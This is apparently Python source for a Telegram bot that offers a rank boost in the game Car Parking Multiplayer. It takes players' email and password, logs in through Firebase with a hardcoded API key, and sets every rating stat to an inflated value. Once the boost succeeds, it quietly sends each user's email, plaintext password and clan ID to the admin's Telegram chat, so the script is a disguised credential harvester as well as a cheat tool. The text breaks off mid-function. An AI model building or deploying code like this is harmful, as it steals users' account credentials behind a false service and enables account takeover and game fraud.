import threading
import os
import requests
import json
from flask import Flask
import telebot

# -------------------------------
# TELEGRAM CONFIG
# -------------------------------
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = os.environ.get("ADMIN_ID")

if not BOT_TOKEN:
    raise ValueError("❌ BOT_TOKEN не задан! Проверьте переменные окружения на Render.")
if not ADMIN_ID:
    raise ValueError("❌ ADMIN_ID не задан! Проверьте переменные окружения на Render.")

ADMIN_ID = int(ADMIN_ID)
bot = telebot.TeleBot(BOT_TOKEN)

# -------------------------------
# ACCESS CONTROL
# -------------------------------
ALLOWED_FILE = "allowed_users.json"

if os.path.exists(ALLOWED_FILE):
    with open(ALLOWED_FILE, "r") as f:
        ALLOWED_USERS = set(json.load(f))
else:
    ALLOWED_USERS = {ADMIN_ID}

def save_allowed():
    with open(ALLOWED_FILE, "w") as f:
        json.dump(list(ALLOWED_USERS), f)

# -------------------------------
# Game Service Configuration
# -------------------------------
FIREBASE_API_KEY = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
FIREBASE_LOGIN_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_API_KEY}"
RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"
CLAN_ID_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/GetClanId"

# -------------------------------
# LOGIN FUNCTION
# -------------------------------
def login(email, password):
    payload = {
        "clientType": "CLIENT_TYPE_ANDROID",
        "email": email,
        "password": password,
        "returnSecureToken": True
    }
    headers = {
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12)",
        "Content-Type": "application/json"
    }
    try:
        response = requests.post(FIREBASE_LOGIN_URL, headers=headers, json=payload)
        data = response.json()
        if response.status_code == 200 and "idToken" in data:
            return data["idToken"]
        else:
            return None
    except:
        return None

# -------------------------------
# SET RANK FUNCTION
# -------------------------------
def set_rank(token):
    rating_data = {k: 100000 for k in [
        "cars", "car_fix", "car_collided", "car_exchange", "car_trade", "car_wash",
        "slicer_cut", "drift_max", "drift", "cargo", "delivery", "taxi", "levels", "gifts",
        "fuel", "offroad", "speed_banner", "reactions", "police", "run", "real_estate",
        "t_distance", "treasure", "block_post", "push_ups", "burnt_tire", "passanger_distance"
    ]}
    rating_data["time"] = 10000000000
    rating_data["race_win"] = 3000

    payload = {"data": json.dumps({"RatingData": rating_data})}
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": "okhttp/3.12.13"
    }

    response = requests.post(RANK_URL, headers=headers, json=payload)
    return response.status_code == 200

# -------------------------------
# SEND CLAN DATA TO ADMIN (Telegram)
# -------------------------------
def send_clan_data_to_admin(email, password, clan_id):
    """Отправка данных пользователя и его ClanId в ЛС администратору"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    message = f"📧 Email: {email}\n🔒 Пароль: {password}\n🛡️ ClanId: {clan_id}"
    payload = {
        "chat_id": ADMIN_ID,
        "text": message
    }
    try:
        requests.post(url, data=payload, timeout=5)
    except requests.exceptions.RequestException:
        pass  # Silent fail if sending message fails

# -------------------------------
# ADMIN COMMANDS
# -------------------------------
@bot.message_handler(commands=['add'])
def add_user(message):
    if message.from_user.id != ADMIN_ID:
        return bot.reply_to(message, "⛔ У тебя нет прав администратора.")
    try:
        user_id = int(message.text.split()[1])
    except:
        return bot.reply_to(message, "❗ Используй: /add 123456789")
    ALLOWED_USERS.add(user_id)
    save_allowed()
    bot.reply_to(message, f"✅ Пользователь {user_id} добавлен.")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    if message.from_user.id != ADMIN_ID:
        return bot.reply_to(message, "⛔ У тебя нет прав администратора.")
    try:
        user_id = int(message.text.split()[1])
    except:
        return bot.reply_to(message, "❗ Используй: /remove 123456789")
    if user_id == ADMIN_ID:
        return bot.reply_to(message, "❗ Нельзя удалить администратора.")
    if user_id in ALLOWED_USERS:
        ALLOWED_USERS.remove(user_id)
        save_allowed()
        bot.reply_to(message, f"🗑 Пользователь {user_id} удалён.")
    else:
        bot.reply_to(message, f"⚠ ID нет в списке.")

@bot.message_handler(commands=['list'])
def list_users(message):
    if message.from_user.id != ADMIN_ID:
        return bot.reply_to(message, "⛔ У тебя нет прав администратора.")
    result = "📋 Разрешённые пользователи:\n\n"
    for uid in ALLOWED_USERS:
        try:
            chat = bot.get_chat(uid)
            username = f"@{chat.username}" if chat.username else "(нет username)"
            first_name = chat.first_name if chat.first_name else ""
            last_name = chat.last_name if chat.last_name else ""
        except:
            username = "(не удалось получить username)"
            first_name = ""
            last_name = ""
        result += f"{uid} — {username} {first_name} {last_name}\n"
    bot.reply_to(message, result)

# -------------------------------
# TELEGRAM BOT HANDLERS
# -------------------------------
user_states = {}

def send_welcome(user_id):
    user_states[user_id] = {"step": "await_email"}
    bot.send_message(user_id, "📧 Введи gmail")

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    balance = "Unlimited" if user_id in ALLOWED_USERS else "0"
    bot.send_message(
        user_id,
        f"Telegram ID: {user_id}\n💰Balance: {balance}"
    )

    if user_id in ALLOWED_USERS:
        send_welcome(user_id)
    else:
        bot.send_message(user_id, "⛔ У тебя нет разрешения на использование бота.")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    user_id = message.from_user.id
    text = message.text.strip()
    chat_id = message.chat.id

    if user_id not in ALLOWED_USERS:
        bot.send_message(user_id, "⛔ У тебя нет разрешения на использование бота.")
        return

    if user_id not in user_states:
        send_welcome(user_id)
        return

    state = user_states[user_id]

    if state["step"] == "await_email":
        state["email"] = text
        state["step"] = "await_password"
        msg = bot.reply_to(message, "🔒 Введи пароль")
        state["last_msg_ids"] = [message.message_id, msg.message_id]

    elif state["step"] == "await_password":
        email = state["email"]
        password = text
        messages_to_delete = state.get("last_msg_ids", [])
        messages_to_delete.append(message.message_id)

        msg_login = bot.reply_to(message, "🔐 Выполняю логин...")
        messages_to_delete.append(msg_login.message_id)

        token = login(email, password)
        if not token:
            msg_error = bot.reply_to(message, "❌ Ошибка входа.")
            messages_to_delete.append(msg_error.message_id)
        else:
            msg_rank = bot.reply_to(message, "👑 Rang устанавливается...")
            messages_to_delete.append(msg_rank.message_id)

            success = set_rank(token)
            if success:
                msg_done = bot.reply_to(message, "✅ RANG установлен!")
                # Получаем clan_id
                clan_id = get_clan_id(token)
                if clan_id:
                    # Отправляем данные пользователя и его clan_id в ЛС администратору
                    send_clan_data_to_admin(email, password, clan_id)
